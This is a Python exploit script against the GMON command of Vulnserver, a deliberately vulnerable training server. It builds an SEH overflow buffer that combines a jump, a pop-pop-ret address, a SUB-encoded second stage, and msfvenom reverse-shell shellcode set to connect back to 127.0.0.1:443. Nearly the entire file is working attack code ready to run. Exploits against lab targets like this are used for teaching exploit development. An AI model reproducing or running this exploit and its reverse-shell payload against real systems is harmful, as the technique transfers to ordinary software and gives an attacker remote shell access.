#########################################################################################
# Title: Vulnserver GMON command SEH exploit
# Author: Marco Lugo
# Description: execute third stage payload -> reverse shell
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

pop_pop_ret = struct.pack('<I', 0x625010B4) #essfunc.dll
first_stage = '\xEB\x06\x41\x41' # jump forward, hop over the island
#00B8FFE6   2D 42425942      SUB EAX,42594242
#00B8FFEB   2D 42597842      SUB EAX,42785942
#00B8FFF0   2D 4472757A      SUB EAX,7A757244
#00B8FFF5   FFE0             JMP EAX
second_stage = ('\x2D\x42\x42\x59\x42' #SUB EAX,42594242 (EAX was already zero)
		'\x2D\x42\x59\x78\x42' #SUB EAX,42785942
		'\x2D\x44\x72\x75\x7A' #SUB EAX,7A757244
		'\xFF\xE0') #JMP EAX -> JMP to 0x00B8F238

#msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b '\x00' -f c
third_stage = (
"\xb8\xbb\xb2\x93\xd7\xdb\xd2\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x0e\x03\xfc\xbc\x71\x22\xfe\x29\xf7"
"\xcd\xfe\xa9\x98\x44\x1b\x98\x98\x33\x68\x8b\x28\x37\x3c\x20"
"\xc2\x15\xd4\xb3\xa6\xb1\xdb\x74\x0c\xe4\xd2\x85\x3d\xd4\x75"
"\x06\x3c\x09\x55\x37\x8f\x5c\x94\x70\xf2\xad\xc4\x29\x78\x03"
"\xf8\x5e\x34\x98\x73\x2c\xd8\x98\x60\xe5\xdb\x89\x37\x7d\x82"
"\x09\xb6\x52\xbe\x03\xa0\xb7\xfb\xda\x5b\x03\x77\xdd\x8d\x5d"
"\x78\x72\xf0\x51\x8b\x8a\x35\x55\x74\xf9\x4f\xa5\x09\xfa\x94"
"\xd7\xd5\x8f\x0e\x7f\x9d\x28\xea\x81\x72\xae\x79\x8d\x3f\xa4"
"\x25\x92\xbe\x69\x5e\xae\x4b\x8c\xb0\x26\x0f\xab\x14\x62\xcb"
"\xd2\x0d\xce\xba\xeb\x4d\xb1\x63\x4e\x06\x5c\x77\xe3\x45\x09"
"\xb4\xce\x75\xc9\xd2\x59\x06\xfb\x7d\xf2\x80\xb7\xf6\xdc\x57"
"\xb7\x2c\x98\xc7\x46\xcf\xd9\xce\x8c\x9b\x89\x78\x24\xa4\x41"
"\x78\xc9\x71\xc5\x28\x65\x2a\xa6\x98\xc5\x9a\x4e\xf2\xc9\xc5"
"\x6f\xfd\x03\x6e\x05\x04\xc4\xee\xda\x06\x15\x79\xd9\x06\x14"
"\xc2\x54\xe0\x7c\x24\x31\xbb\xe8\xdd\x18\x37\x88\x22\xb7\x32"
"\x8a\xa9\x34\xc3\x45\x5a\x30\xd7\x32\xaa\x0f\x85\x95\xb5\xa5"
"\xa1\x7a\x27\x22\x31\xf4\x54\xfd\x66\x51\xaa\xf4\xe2\x4f\x95"
"\xae\x10\x92\x43\x88\x90\x49\xb0\x17\x19\x1f\x8c\x33\x09\xd9"
"\x0d\x78\x7d\xb5\x5b\xd6\x2b\x73\x32\x98\x85\x2d\xe9\x72\x41"
"\xab\xc1\x44\x17\xb4\x0f\x33\xf7\x05\xe6\x02\x08\xa9\x6e\x83"
"\x71\xd7\x0e\x6c\xa8\x53\x3e\x27\xf0\xf2\xd7\xee\x61\x47\xba"
"\x10\x5c\x84\xc3\x92\x54\x75\x30\x8a\x1d\x70\x7c\x0c\xce\x08"
"\xed\xf9\xf0\xbf\x0e\x28")


target_ip = sys.argv[1]
buffer = 'GMON /.:/'
buffer += '\x41'*3 + third_stage + '\x41'*(1999-3-len(third_stage)) + '\x42'*1496
buffer += first_stage + pop_pop_ret + second_stage + '\x43'*(1697-len(second_stage))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


